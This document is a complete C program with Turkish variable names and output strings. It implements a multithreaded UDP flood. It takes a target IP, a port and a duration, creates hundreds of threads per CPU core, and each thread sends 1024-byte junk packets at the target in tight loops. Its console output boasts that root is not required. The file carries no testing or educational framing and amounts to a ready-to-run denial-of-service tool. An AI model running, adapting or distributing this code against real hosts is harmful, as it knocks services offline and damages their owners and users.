#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <time.h>
#include <pthread.h>
#include <signal.h>

#define PAYLOAD_SIZE 1024
#define THREAD_PER_PROCESS 200
#define BATCH_SIZE 32

volatile int calis = 1;
char hedef_ip[16];
int hedef_port;
int sure;

void *udp_gonder(void *arg) {
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) return NULL;
    
    struct sockaddr_in dst;
    dst.sin_family = AF_INET;
    dst.sin_port = htons(hedef_port);
    inet_pton(AF_INET, hedef_ip, &dst.sin_addr);
    
    char *veri = malloc(PAYLOAD_SIZE);
    memset(veri, 'X', PAYLOAD_SIZE);
    
    while (calis) {
        for (int b = 0; b < BATCH_SIZE; b++) {
            sendto(sock, veri, PAYLOAD_SIZE, 0, (struct sockaddr *)&dst, sizeof(dst));
        }
    }
    free(veri);
    close(sock);
    return NULL;
}

void sig_handler(int sig) { calis = 0; }

int main(int argc, char *argv[]) {
    if (argc != 4) {
        printf("Kullanım: %s <IP> <PORT> <SANIYE>\n", argv[0]);
        return 1;
    }
    strcpy(hedef_ip, argv[1]);
    hedef_port = atoi(argv[2]);
    sure = atoi(argv[3]);
    
    signal(SIGINT, sig_handler);
    srand(time(NULL));
    
    int process_count = sysconf(_SC_NPROCESSORS_ONLN) * 2;
    printf("[+] Hedef: %s:%d (Root gerekmez)\n", hedef_ip, hedef_port);
    printf("[+] Süre: %d saniye\n", sure);
    printf("[+] İşlem: %d, Thread/işlem: %d\n", process_count, THREAD_PER_PROCESS);
    
    pthread_t *threads = malloc(sizeof(pthread_t) * process_count * THREAD_PER_PROCESS);
    int idx = 0;
    for (int i = 0; i < process_count; i++)
        for (int j = 0; j < THREAD_PER_PROCESS; j++)
            pthread_create(&threads[idx++], NULL, udp_gonder, NULL);
    
    time_t baslangic = time(NULL);
    while (time(NULL) - baslangic < sure && calis) sleep(1);
    
    calis = 0;
    sleep(2);
    printf("[+] Tamamlandı.\n");
    free(threads);
    return 0;
}
